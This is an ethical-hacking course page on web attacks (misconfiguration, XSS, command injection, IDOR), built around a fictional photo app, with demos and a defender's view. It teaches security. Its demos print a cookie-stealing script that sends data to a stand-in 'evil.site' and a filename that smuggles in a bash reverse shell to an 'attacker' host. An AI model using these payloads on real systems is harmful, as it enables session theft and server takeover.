---
hide:
  - navigation
---

[← Course home](../index.html) · Ethical Hacking

# Week 9 · Web Attacks I

<style>
.wk8{--w-navy:#26324f;--w-ink:#1f2836;--w-muted:#5b6880;--w-surface:#f6f8fb;--w-card:#ffffff;--w-line:#e3e8f0;--w-teal:#0a7589;--w-tealink:#064a59;--w-red:#c1392b;--w-amber:#a9700f;--w-teal-t:#e3f1f4;--w-red-t:#f8e7e4;--w-amber-t:#f6edda;--w-navy-t:#eaedf4;
  font-family:inherit;color:var(--w-ink);}
[data-md-color-scheme="slate"] .wk8{--w-navy:#9fb0d0;--w-ink:#e7edf6;--w-muted:#9fadc3;--w-surface:#1a2338;--w-card:#1f2a42;--w-line:#33405c;--w-teal:#3bb6ce;--w-tealink:#6fcde0;--w-red:#e4786c;--w-amber:#d8a646;--w-teal-t:#123038;--w-red-t:#331f1c;--w-amber-t:#322a16;--w-navy-t:#1b2740;}
.wk8 *{box-sizing:border-box}
.wk8 .lead{font-size:1.05rem;color:var(--w-muted);max-width:62ch;margin:.2rem 0 1.2rem}
.wk8 .eyebrow{font-size:.72rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--w-tealink);margin:.1rem 0 .15rem}
.wk8 h2.w{font-size:1.4rem;margin:2.4rem 0 .3rem;color:var(--w-ink);scroll-margin-top:70px;display:flex;align-items:baseline;gap:.5rem;flex-wrap:wrap}
.wk8 h2.w .num{font-size:.7rem;font-weight:700;letter-spacing:.06em;color:#fff;background:var(--w-navy);border-radius:999px;padding:.15rem .55rem}
.wk8 figure{margin:1rem 0;}
.wk8 figcaption{font-size:.82rem;color:var(--w-muted);margin-top:.4rem;text-align:center}
.wk8 svg{max-width:100%;height:auto;color:var(--w-ink);display:block;margin:0 auto}
.wk8 .node-fill{fill:var(--w-card)}.wk8 .node-line{stroke:var(--w-line)}.wk8 .teal{fill:var(--w-teal)}.wk8 .teal-s{stroke:var(--w-teal)}.wk8 .amber{fill:var(--w-amber)}
.wk8 .svg-t{fill:var(--w-ink);font-family:inherit}
.wk8 .svg-m{fill:var(--w-muted);font-family:inherit}
/* CEH strip */
.wk8 .ceh{display:flex;flex-wrap:wrap;gap:6px;margin:1rem 0 1.4rem}
.wk8 .ph{flex:1 1 130px;min-width:0;border:1px solid var(--w-line);border-radius:9px;background:var(--w-card);padding:.5rem .65rem}
.wk8 .ph .n{font-size:.6rem;letter-spacing:.09em;text-transform:uppercase;color:var(--w-muted);font-weight:700}
.wk8 .ph .t{font-size:.85rem;font-weight:600}
.wk8 .ph.done{opacity:.7}.wk8 .ph.done .t::after{content:" ✓";color:var(--w-teal)}
.wk8 .ph.here{border-color:var(--w-teal);background:var(--w-teal-t)}
.wk8 .ph.here .n{color:var(--w-tealink)}
.wk8 .ph .hr{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--w-tealink)}
/* cards */
.wk8 .cards{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:1rem 0}
.wk8 .card{border:1px solid var(--w-line);background:var(--w-card);border-radius:11px;padding:13px 15px;min-width:0}
.wk8 .card .mini{font-size:.6rem;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--w-tealink);display:block;margin-bottom:3px}
.wk8 .card h4{margin:.1rem 0 .3rem;font-size:1rem}
.wk8 .card p{margin:.2rem 0;font-size:.9rem;color:var(--w-ink)}
.wk8 .card.def{background:var(--w-teal-t);border-color:var(--w-teal)}
.wk8 .card.def .mini{color:var(--w-tealink)}
.wk8 .card.def .mini::before{content:"🛡 "}
.wk8 .card.amber{background:var(--w-amber-t);border-color:var(--w-amber)}
.wk8 .card.amber .mini{color:var(--w-amber)}
.wk8 .card.red{background:var(--w-red-t);border-color:var(--w-red)}
.wk8 .card.red .mini{color:var(--w-red)}
.wk8 .axisbox{border:1px solid var(--w-line);border-left:4px solid var(--w-teal);background:var(--w-surface);border-radius:8px;padding:.7rem .9rem;margin:1rem 0;font-size:.92rem}
.wk8 .oneliner{font-size:1.2rem;font-weight:700;line-height:1.4;border-top:1px solid var(--w-line);border-bottom:1px solid var(--w-line);padding:1.1rem 0;margin:1.6rem 0;color:var(--w-ink)}
.wk8 .oneliner .k{color:var(--w-tealink)}.wk8 .oneliner .r{color:var(--w-red)}
.wk8 .pills{display:flex;flex-wrap:wrap;gap:7px;margin:.8rem 0}
.wk8 .pill{border:1px solid var(--w-line);background:var(--w-card);border-radius:999px;padding:5px 12px;font-size:.82rem}
.wk8 .pill b{color:var(--w-tealink)}
/* ===== attack explorer ===== */
.wk8 .ax-tabs{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:.6rem 0 0}
.wk8 .ax-tab{border:1px solid var(--w-line);background:var(--w-card);border-radius:10px;padding:11px 9px;cursor:pointer;text-align:left;font:inherit;color:var(--w-ink);transition:border-color .15s,transform .1s;min-width:0}
.wk8 .ax-tab:hover{transform:translateY(-1px)}
.wk8 .ax-tab .ic{font-size:1.1rem}
.wk8 .ax-tab .nm{display:block;font-weight:700;font-size:.9rem;margin-top:2px;line-height:1.15}
.wk8 .ax-tab .ow{display:block;font-size:.62rem;text-transform:uppercase;letter-spacing:.04em;color:var(--w-muted);font-weight:700;margin-top:3px}
.wk8 .ax-tab.on{border-color:var(--ac);background:var(--ac-t);box-shadow:inset 0 0 0 1px var(--ac)}
.wk8 .ax-tab.on .ow{color:var(--ac)}
.wk8 .ax-panel{display:none;border:1px solid var(--w-line);border-top:3px solid var(--ac);border-radius:0 0 12px 12px;background:var(--w-card);padding:16px 18px;margin-top:-1px}
.wk8 .ax-panel.on{display:block;animation:axin .2s ease}
@keyframes axin{from{opacity:0;transform:translateY(4px)}to{opacity:1}}
.wk8 .ax-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;align-items:start}
.wk8 .ax-why{font-size:.92rem}
.wk8 .ax-why h4{margin:0 0 .3rem;font-size:1.05rem;color:var(--ac)}
.wk8 .ax-why p{margin:.35rem 0}
.wk8 .ax-rw{display:block;margin-top:.7rem;padding-top:.6rem;border-top:1px solid var(--w-line);font-size:.82rem;color:var(--w-muted)}
.wk8 .ax-rw b{color:var(--w-ink)}
.wk8 .vtag{display:inline-block;font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;border-radius:999px;padding:2px 8px;background:var(--ac-t);color:var(--ac);border:1px solid var(--ac);margin-bottom:.4rem}
/* demo surface */
.wk8 .demo{background:var(--w-surface);border:1px solid var(--w-line);border-radius:10px;padding:12px}
.wk8 .demo .cap{font-size:.6rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--w-muted);margin-bottom:7px}
.wk8 .uibar{display:flex;align-items:center;gap:7px;background:var(--w-card);border:1px solid var(--w-line);border-radius:7px;padding:5px 9px;font-family:var(--md-code-font,"Roboto Mono"),monospace;font-size:.8rem;color:var(--w-ink);flex-wrap:wrap}
.wk8 .uibar .mono{font-family:var(--md-code-font,"Roboto Mono"),monospace}
.wk8 .hot{color:var(--w-red);font-weight:700}
.wk8 .scene{height:92px;border-radius:7px;margin:9px 0;position:relative;overflow:hidden}
.wk8 .scene .lbl{position:absolute;left:0;right:0;bottom:0;padding:5px 9px;font-size:.72rem;color:#fff;background:linear-gradient(180deg,transparent,rgba(0,0,0,.5))}
.wk8 .scene.mtn{background:linear-gradient(180deg,#cdd8e2,#8aa0ad 70%,#5f7784)}
.wk8 .scene.beach{background:linear-gradient(180deg,#f7b24a,#ef8f52 45%,#7c5a7e 80%,#3b3a5e)}
.wk8 .btn-run{font:inherit;font-size:.82rem;font-weight:700;border:1px solid var(--ac);background:var(--ac);color:#fff;border-radius:8px;padding:7px 14px;cursor:pointer;margin-top:4px}
.wk8 .btn-run:hover{filter:brightness(1.06)}
.wk8 .step{font-family:var(--md-code-font,"Roboto Mono"),monospace;font-size:.78rem;background:#0f1720;color:#cdd6e2;border-radius:8px;padding:10px 12px;margin-top:9px;line-height:1.6}
.wk8 .step .cmt{color:#6b7a8d}.wk8 .step .inj{color:#ff8a7a;font-weight:700}.wk8 .step .ok2{color:#7fe0b0}.wk8 .step .arr{color:#f3b14e}
.wk8 .out{margin-top:9px;font-size:.84rem;border-radius:8px;padding:9px 11px;display:none}
.wk8 .out.show{display:block;animation:axin .2s ease}
.wk8 .out.bad{background:var(--w-red-t);border:1px solid var(--w-red);color:var(--w-red)}
.wk8 .out.warn{background:var(--w-amber-t);border:1px solid var(--w-amber);color:var(--w-amber)}
.wk8 .idbtn{font:inherit;font-weight:700;border:1px solid var(--ac);background:var(--w-card);color:var(--ac);border-radius:6px;padding:2px 9px;cursor:pointer}
@media(max-width:640px){.wk8 .cards{grid-template-columns:1fr}.wk8 .ax-tabs{grid-template-columns:1fr 1fr}.wk8 .ax-grid{grid-template-columns:1fr}}
</style>

<div class="wk8" markdown="0">
<span class="kc-badge">🧭 <span class="eb-layer">Application</span><span class="eb-sep"> · </span><span class="eb-phase">CEH: Gaining Access (web)</span><span class="eb-sep"> · </span><span class="eb-sum">attacking the layer your users actually touch — on one example app, PhotoViewer</span></span>
<p class="lead">We're through the network and off the host. Now the <b>application</b> — the part users interact with, exposed to the whole internet by design, and the biggest target there is. One running example all week: <b>PhotoViewer</b>, a photo-sharing app.</p>
<div class="ceh" role="img" aria-label="CEH life cycle: phases 1 and 2 done, phase 3 Gaining Access at the application layer is this week">
<div class="ph done"><span class="n">Phase 1</span><div class="t">Reconnaissance</div></div>
<div class="ph done"><span class="n">Phase 2</span><div class="t">Scanning</div></div>
<div class="ph here"><span class="n">Phase 3</span><div class="t">Gaining Access — web</div><span class="hr">You are here</span></div>
<div class="ph"><span class="n">Phase 4</span><div class="t">Maintaining Access</div></div>
<div class="ph"><span class="n">Phase 5</span><div class="t">Covering Tracks</div></div>
</div>
<div class="axisbox"><b>One idea to carry all week.</b> A <b>static</b> site that just hands out pictures is almost nothing to attack. The moment the app takes <b>input</b> — a login, a search, a caption, a filename — and <i>does something</i> with it, you've created the attack surface. Every attack below abuses the trust the app places in input.</div>
<h2 class="w" id="s-arch">The machine you're attacking</h2>
<p class="lead">PhotoViewer is three tiers: a web server (serves the page), an app server (the logic), and a data tier — a <b>catalog database</b> (who owns which photo, public or private, and <i>where it's stored</i>) plus the <b>photo store</b> itself. Walk one request:</p>
<figure>
<svg viewBox="0 0 640 226" role="img" aria-label="Request flow: Mary's browser logs in and gets a token, asks the app for her photos, the app queries the catalog database, returns JSON with storage URLs, and the browser fetches each photo directly from the photo store">
<g text-anchor="middle" font-size="11.5">
<rect x="6" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="66" y="100" font-weight="700">🧑‍💻 Mary</text><text class="svg-m" x="66" y="117" font-size="10">browser + JS</text>
<rect x="176" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="236" y="98" font-weight="700" font-size="11">Web server</text><text class="svg-m" x="236" y="114" font-size="9.5">presentation</text>
<rect x="346" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="406" y="98" font-weight="700" font-size="11">App server</text><text class="svg-m" x="406" y="114" font-size="9.5">the logic</text>
<rect x="516" y="14" width="118" height="50" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="575" y="34" font-weight="700" font-size="11">Catalog DB</text><text class="svg-m" x="575" y="50" font-size="9.5">owner · public? · URL</text>
<rect x="516" y="146" width="118" height="50" rx="8" style="fill:var(--w-amber-t)" class="amber" fill-opacity="1"></rect>
<rect x="516" y="146" width="118" height="50" rx="8" fill="none" style="stroke:var(--w-amber)" stroke-width="1.5"></rect>
<text x="575" y="166" font-weight="700" font-size="11" style="fill:var(--w-amber)">Photo store</text><text class="svg-m" x="575" y="182" font-size="9.5">the actual files</text>
<g class="teal-s" stroke-width="1.8" marker-end="url(#ar)">
<line x1="126" y1="96" x2="172" y2="96"></line>
<line x1="296" y1="105" x2="342" y2="105"></line>
<line x1="466" y1="92" x2="512" y2="48"></line>
</g>
<text class="svg-m" x="150" y="88" font-size="9">① login→token</text>
<text class="svg-m" x="150" y="128" font-size="9">② GET /photos +token</text>
<text class="svg-m" x="406" y="150" font-size="9">③ query owner=Mary</text>
<path d="M512 56 L470 104" fill="none" class="teal-s" stroke-width="1.6" stroke-dasharray="4 3" marker-end="url(#ar)"></path>
<text class="svg-m" x="300" y="150" font-size="9">④ JSON: list of photo URLs</text>
<path d="M66 132 L66 214 L500 214 L512 182" fill="none" style="stroke:var(--w-amber)" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ara)"></path>
<text x="285" y="201" font-size="9.5" font-weight="700" style="fill:var(--w-amber)">⑤ browser fetches each photo URL straight from the store</text>
</g>
<defs>
<marker id="ar" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0,0 7,3 0,6" class="teal"></polygon></marker>
<marker id="ara" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0,0 7,3 0,6" class="amber"></polygon></marker>
</defs>
</svg>
<figcaption>Hold onto step ⑤: the browser reaches the photo store <i>directly</i>, using the URLs from step ④. That's the opening for the first attack.</figcaption>
</figure>
<h2 class="w" id="s-attacks">The four attacks — click to explore</h2>
<p class="lead">Each one abuses input the app should have checked. Pick an attack: you get the move, a live demo, and the real-world case.</p>
<div class="ax-tabs" role="tablist">
  <button class="ax-tab on" data-ax="cfg" style="--ac:var(--w-amber);--ac-t:var(--w-amber-t)" role="tab"><span class="ic">⚙️</span><span class="nm">Misconfiguration</span><span class="ow">OWASP A05</span></button>
  <button class="ax-tab" data-ax="xss" style="--ac:var(--w-red);--ac-t:var(--w-red-t)" role="tab"><span class="ic">📝</span><span class="nm">Cross-site scripting</span><span class="ow">OWASP A03</span></button>
  <button class="ax-tab" data-ax="cmd" style="--ac:var(--w-red);--ac-t:var(--w-red-t)" role="tab"><span class="ic">🖥️</span><span class="nm">OS command injection</span><span class="ow">OWASP A03</span></button>
  <button class="ax-tab" data-ax="idor" style="--ac:var(--w-red);--ac-t:var(--w-red-t)" role="tab"><span class="ic">🔢</span><span class="nm">IDOR / access control</span><span class="ow">OWASP A01</span></button>
</div>
<div class="ax-panel on" data-ax="cfg" style="--ac:var(--w-amber);--ac-t:var(--w-amber-t)">
  <div class="ax-grid">
    <div class="ax-why">
      <span class="vtag">Security misconfiguration</span>
      <h4>The store left open</h4>
      <p>The code is fine — a <b>setting</b> was left loose. Step ④ handed Mary the <b>storage URLs</b>. If the store is public, she requests them <b>directly and skips the app</b>, reaching photos other users marked private.</p>
      <p>Same family: an <code>/admin</code> page on <b>admin / admin</b>, a database on its <b>default password</b>, verbose errors that leak the schema.</p>
      <span class="ax-rw"><b>Real world — Deep Root Analytics, 2017:</b> a public cloud bucket exposed ~<b>198 million</b> US voter records. No exploit — just access left out.</span>
    </div>
    <div class="demo">
      <div class="cap">The JSON PhotoViewer returned</div>
      <div class="uibar"><span class="mono">"url": "store.photoapp.com/<span class="hot">p/8842.jpg</span>"</span></div>
      <button class="btn-run" data-run="cfg">▶ Request that URL directly (no login)</button>
      <div class="out bad" data-out="cfg">⚠ 200 OK — the store served the file with <b>no check</b>. Swap the number and you walk the whole store.</div>
    </div>
  </div>
</div>
<div class="ax-panel" data-ax="xss" style="--ac:var(--w-red);--ac-t:var(--w-red-t)">
  <div class="ax-grid">
    <div class="ax-why">
      <span class="vtag">Cross-site scripting</span>
      <h4>A caption that runs</h4>
      <p>A caption is supposed to be <b>text</b> — but PhotoViewer writes it <b>straight into the page's HTML</b>. Make the caption a <code>&lt;script&gt;</code>, and it runs in the <b>next viewer's browser</b>, with <i>their</i> session. The classic payload steals their cookie.</p>
      <p>Input was never sanitized; output was never encoded.</p>
      <span class="ax-rw"><b>Real world — TweetDeck, 2014:</b> a script inside a post ran in the TweetDeck client (twitter.com stripped it) and <b>self-spread</b> as a worm across feeds.</span>
    </div>
    <div class="demo">
      <div class="cap">Mary's "caption" on photo 8842</div>
      <div class="uibar"><span class="mono">&lt;script&gt;fetch('evil.site/c='+document.cookie)&lt;/script&gt;</span></div>
      <button class="btn-run" data-run="xss">▶ Now Bob opens the photo</button>
      <div class="out bad" data-out="xss">⚠ Bob's browser <b>ran Mary's script</b> → Bob's session cookie was just sent to <b>evil.site</b>. Victim: another user.</div>
    </div>
  </div>
</div>
<div class="ax-panel" data-ax="cmd" style="--ac:var(--w-red);--ac-t:var(--w-red-t)">
  <div class="ax-grid">
    <div class="ax-why">
      <span class="vtag">OS command injection</span>
      <h4>Name the file a command</h4>
      <p>To make a thumbnail, the server runs a real OS command and pastes your <b>filename</b> into it. But the filename is yours. Add a <code>;</code> and a command of your own — the <code>;</code> ends the resize and <b>starts your command</b>, and the shell runs both.</p>
      <p>It opens a shell back to you — now you're on the server.</p>
      <span class="ax-rw"><b>Real world — ImageMagick "ImageTragick", 2016 (CVE-2016-3714):</b> a crafted uploaded image ran commands on any site that processed it.</span>
    </div>
    <div class="demo">
      <div class="cap">You upload a file named…</div>
      <div class="uibar"><span class="mono">vacation.jpg<span class="hot">; bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</span></span></div>
      <button class="btn-run" data-run="cmd">▶ Server builds the thumbnail</button>
      <div class="step" data-out="cmd" style="display:none">
        <span class="cmt"># the server runs:</span><br>
        convert vacation.jpg<span class="inj">; bash -i &gt;&amp;…</span> -resize 200x200 thumb.jpg<br>
        <span class="arr">→</span> <span class="ok2">reverse shell opened</span> <span class="cmt">(nothing shown on the page)</span>
      </div>
    </div>
  </div>
</div>
<div class="ax-panel" data-ax="idor" style="--ac:var(--w-red);--ac-t:var(--w-red-t)">
  <div class="ax-grid">
    <div class="ax-why">
      <span class="vtag">Broken access control (IDOR)</span>
      <h4>Ask for what isn't yours</h4>
      <p>The app checks you're <b>logged in</b>, but never that the photo is <b>yours</b>. Mary opens hers at <code>?id=123</code> — then just changes the number. Walk the ids and you pull <b>everyone's</b> private photos.</p>
      <p>The bug is the <b>missing ownership check</b>.</p>
      <span class="ax-rw"><b>Real world — First American, 2019:</b> ~885 million mortgage files exposed by changing the number in a document URL.</span>
    </div>
    <div class="demo">
      <div class="cap">Try it — change the id</div>
      <div class="uibar">photoapp.com/photos?id=<span class="mono hot" id="idval">123</span> &nbsp;<button class="idbtn" data-run="idor">+1</button></div>
      <div class="scene mtn" id="idscene"><span class="lbl" id="idlbl">🔓 Mary's photo — Foggy morning</span></div>
      <div class="out warn" data-out="idor" id="idout">✓ logged in as Mary &nbsp;·&nbsp; the app never checked who owns photo 123.</div>
    </div>
  </div>
</div>
<p class="oneliner">Every attack here is the same move: <span class="r">input the app trusted</span> that it should have <span class="k">checked</span>.</p>
<h2 class="w" id="s-defender">The defender's view</h2>
<div class="cards">
<div class="card def"><span class="mini">XSS &amp; injection</span><p><b>Sanitize input, encode output</b> — a caption can't become a script, a filename can't become a command</p></div>
<div class="card def"><span class="mini">IDOR</span><p><b>Check ownership on every object</b> — logged-in is not the same as authorized</p></div>
<div class="card def"><span class="mini">Misconfiguration</span><p><b>Lock the store, change defaults, patch</b> — no public buckets, no <code>admin/admin</code></p></div>
<div class="card def"><span class="mini">Behind it all</span><p>A <b>WAF</b> and access-log monitoring catch the payloads a slip lets through</p></div>
</div>
<p style="font-size:.93rem;color:var(--w-muted)">Injection lands in three places — the <b>browser</b> (XSS), the <b>OS</b> (command injection), and the <b>database</b>. Two are shown here; the database — <b>SQL injection</b> — and stealing the <b>session</b> are in <b><a href="web-attacks-sqli-session.html">Web Attacks II</a></b>.</p>
</div>
??? info "📎 In industry terms — CEH · Cyber Kill Chain · ATT&CK · OWASP"

    - **CEH phase:** Gaining Access, at the application layer (Phase 3)
    - **Cyber Kill Chain:** Delivery → Exploitation → Installation (web shell)
    - **MITRE ATT&CK:** [T1190 Exploit Public-Facing App](https://attack.mitre.org/techniques/T1190/) · [T1059 Command &amp; Scripting](https://attack.mitre.org/techniques/T1059/) · [T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003/)
    - **OWASP Top 10:** A01 Broken Access Control (IDOR) · A03 Injection (XSS, command) · A05 Security Misconfiguration

    New to these frameworks? The full map is in **[Week 1 · frameworks](ethics-law-methodology.html)**.

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the industry list of critical web risks
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — how to test for each
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free hands-on labs for XSS, access control, command injection
- [MITRE ATT&CK](https://attack.mitre.org/) — T1190, T1059, T1505.003
- [ImageTragick (CVE-2016-3714)](https://imagetragick.com/) — the image-upload command-injection case

<script>
(function(){
  var root=document.querySelector('.wk8'); if(!root) return;
  // attack explorer tabs
  var tabs=root.querySelectorAll('.ax-tab'), panels=root.querySelectorAll('.ax-panel');
  tabs.forEach(function(t){
    t.addEventListener('click',function(){
      var k=t.getAttribute('data-ax');
      tabs.forEach(function(x){x.classList.toggle('on',x===t);});
      panels.forEach(function(p){p.classList.toggle('on',p.getAttribute('data-ax')===k);});
    });
  });
  // simple reveal demos (cfg, xss)
  root.querySelectorAll('.btn-run[data-run="cfg"],.btn-run[data-run="xss"]').forEach(function(b){
    b.addEventListener('click',function(){
      var k=b.getAttribute('data-run');
      var o=root.querySelector('.out[data-out="'+k+'"]'); if(o) o.classList.add('show');
    });
  });
  // command injection step reveal
  var cmdb=root.querySelector('.btn-run[data-run="cmd"]');
  if(cmdb) cmdb.addEventListener('click',function(){
    var s=root.querySelector('.step[data-out="cmd"]'); if(s) s.style.display='block';
  });
  // IDOR: change the id, swap the photo
  var idb=root.querySelector('[data-run="idor"]'), idv=root.querySelector('#idval'),
      scene=root.querySelector('#idscene'), lbl=root.querySelector('#idlbl'),
      out=root.querySelector('#idout');
  if(idb) idb.addEventListener('click',function(){
    var n=parseInt(idv.textContent,10)+1; idv.textContent=n;
    if(n>123){
      scene.className='scene beach'; lbl.innerHTML="🔒 David's PRIVATE photo — Honeymoon, Maui";
      out.className='out bad show'; out.innerHTML="✗ Not yours — but the app handed it over. It checked you're logged in, never that photo "+n+" is yours.";
    }
  });
})();
</script>
